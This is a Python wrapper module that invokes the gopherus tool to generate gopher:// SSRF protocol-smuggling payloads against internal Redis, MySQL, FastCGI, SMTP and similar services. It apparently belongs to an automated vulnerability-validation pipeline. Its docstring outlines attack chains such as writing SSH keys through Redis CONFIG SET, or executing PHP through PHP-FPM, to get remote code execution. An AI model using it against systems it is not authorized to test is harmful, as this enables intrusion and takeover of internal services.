"""
gopherus wrapper — generate gopher:// payloads for protocol-smuggling SSRF.

When the validator has confirmed a partial SSRF primitive (we can make the
server connect outbound) but needs to prove it reaches a meaningful internal
target (Redis, Memcached, MySQL, FastCGI), gopherus generates a fully-formed
gopher:// URL that, when fetched, sends the exact bytes those protocols need
to execute a useful operation.

Examples:
  Redis     → SET ssh-key ... + CONFIG SET dir ~/.ssh  →  RCE
  MySQL     → handshake + EXEC arbitrary SQL
  FastCGI   → PHP exec via PHP-FPM
"""
from __future__ import annotations

import os
import re
import subprocess


GOPHERUS_BIN = os.environ.get("GOPHERUS_BIN", "gopherus")
SUPPORTED_EXPLOITS = [
    "redis", "mongodb", "mysql", "postgres", "memcached",
    "fastcgi", "smtp", "zabbix",
]


def run_gopherus(
    exploit: str,            # one of SUPPORTED_EXPLOITS
    command: str | None = None,
    extra_args: list[str] | None = None,
    timeout: int = 30,
) -> dict:
    """Invoke gopherus interactively-by-stdin to generate a payload."""
    if exploit not in SUPPORTED_EXPLOITS:
        return {"error": f"unknown exploit: {exploit}",
                 "supported": SUPPORTED_EXPLOITS}
    cmd = [GOPHERUS_BIN, "--exploit", exploit]
    if extra_args:
        cmd += extra_args
    # gopherus often prompts interactively; we feed the command on stdin
    stdin = (command + "\n") if command else "\n"
    try:
        proc = subprocess.run(
            cmd, input=stdin, capture_output=True, text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return {"error": "gopherus timeout"}
    except FileNotFoundError:
        return {"error": "gopherus not installed (pip install gopherus)"}

    if proc.returncode != 0:
        return {"error": "gopherus failed",
                 "stderr": proc.stderr.strip()[:500]}
    # Extract the gopher:// URL from output
    m = re.search(r"(gopher://\S+)", proc.stdout)
    url = m.group(1) if m else None
    return {
        "summary": (
            f"gopherus generated payload for {exploit}"
            + (": " + url[:120] if url else " (URL not parsed)")
        ),
        "exploit": exploit,
        "gopher_url": url,
        "raw_output": proc.stdout[-2000:],
    }
